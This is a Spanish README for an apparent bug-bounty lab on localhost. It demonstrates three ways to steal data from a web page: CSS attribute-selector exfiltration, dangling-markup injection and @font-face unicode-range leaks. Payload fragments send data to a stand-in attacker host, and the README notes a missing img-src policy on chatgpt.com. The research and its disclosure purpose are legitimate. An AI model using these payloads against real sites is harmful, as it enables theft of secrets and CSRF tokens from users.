# 🧪 Laboratorio local — CSS exfiltration + Dangling Markup Injection

Laboratorio **100% local** (127.0.0.1) que demuestra, con un Chromium real vía CDP
(Edge de la suite, perfil `css-exfil-lab`), las tres técnicas de exfiltración
"solo CSS / solo HTML" evaluadas para el programa OpenAI:

1. **CSS attribute exfiltration** — un `<link rel="stylesheet">` inyectado hacia
   el atacante; el CSS usa selectores de atributo (`input[name="secret"][value^="…"]`)
   con `background-image:url(//atacante/collect?…)`. El navegador dispara la
   petición SOLO cuando el valor del atributo coincide → el atacante reconstruye
   el secreto **carácter a carácter** (una ronda por posición).
2. **DMI (dangling markup)** — `<img src='//atacante/dmi?` SIN cerrar: el parser
   captura todo el HTML siguiente (el secreto) dentro del atributo `src` hasta la
   siguiente comilla y el navegador lo envía al atacante en **una sola petición**.
3. **@font-face unicode-range** — una `@font-face` por carácter candidato con
   `unicode-range:U+XXXX` y `src:url(//atacante/font?char=c)`. La víctima renderiza
   el secreto como **texto** con la font-family envenenada; el navegador solo
   descarga las caras de los caracteres realmente presentes → cada petición
   delata un carácter del secreto (**detección de presencia en una sola ronda**).

## Ejecutar

```bash
node lab/css-exfil/run.js
```

- Atacante: `http://127.0.0.1:8102` (sirve `/css.css`, registra `/collect` y `/dmi`, log en `/log`)
- Víctima: `http://127.0.0.1:8101/victim-css?round=N&prefix=P` y `/victim-dmi`
- CDP del navegador: puerto 9244

Salida en `lab/css-exfil/output/`: `resultado.json` (resumen), `log-atacante.json`
(todas las peticiones de exfiltración) y dos pantallazos de la página víctima.

## Resultado verificado (2026-09-06)

- CSS exfil: secreto `S3cRet-XyZ7` recuperado **íntegro** (11 rondas, 1 char/ronda) ✅
- DMI: el HTML colgante capturado contiene el secreto y llega al atacante ✅
- @font-face: el atacante detectó el **conjunto exacto** de los 11 caracteres únicos
  del secreto en **1 sola ronda** (11 peticiones, 67 reglas) ✅

## Comparación señal/ruido (medida en el lab)

| Técnica | Rondas | Peticiones útiles | Reglas generadas | Qué obtiene | Requiere |
|---|---|---|---|---|---|
| CSS atributos | N (una por posición) | N | N×67 (737 para 11 chars) | **orden exacto** | secreto en **atributo** (`value^=`) |
| @font-face unicode-range | **1** | N.º de chars únicos | 67 | conjunto de chars presentes, **sin orden** | secreto como **texto** con font-family controlada |
| DMI | 1 | 1 | 0 | secreto **completo** | inyección de markup sin cerrar antes del secreto |

**Lectura:** @font-face es la más eficiente en rondas (1 vs N) pero la menos
informativa (sin orden ni repeticiones → el ataque de reconstrucción completa
necesitaría igualmente rondas para ordenar los caracteres, y no funciona si el
secreto está solo en atributo). CSS-atributos es la más ruidosa a escala (737
reglas × N rondas) pero la única que da orden sin DMI. DMI domina en coste
(1 petición, todo el contenido) pero exige el requisito más raro: colgar el
markup antes del secreto. En chatgpt.com hoy no hay punto de inyección para
ninguna de las tres (ver doc CSP/sanitizador).

## Hallazgos técnicos del lab (útiles para el informe si algún día hay vector)

- **Chromium bloquea la imagen DMI si el valor capturado contiene newline**
  (`blockedReason: "other"`, error vacío): las URLs de imagen con caracteres de
  control dentro del atributo no se envían. La variante de una línea sí funciona.
- **El canal de salida no depende de CSP**: en el lab no hay CSP y las peticiones
  `background-image`/`<img>` cruzadas a otro origen llegan sin problema. En
  chatgpt.com tampoco hay `img-src` (ver `OPENAI-CSP-SANITIZER-CSS-EXFIL-2026-09-06.md`),
  así que, de existir un punto de inyección, el canal estaría abierto.
- **La exfiltración CSS es ciega y por fuerza bruta** (1 petición por candidato y
  posición): ruidosa a escala; el umbral de reporte exige token real capturado en
  PoC propio (ver doc CSP/sanitizador, §4).

## Notas de cumplimiento

- Sin interacción con ningún endpoint en scope: solo `127.0.0.1`, datos sintéticos
  (`S3cRet-XyZ7`, `CSRF-TOKEN-…`), sin cookies reales, sin red externa.
- Es la plantilla verificada para usar SI aparece un punto de inyección real.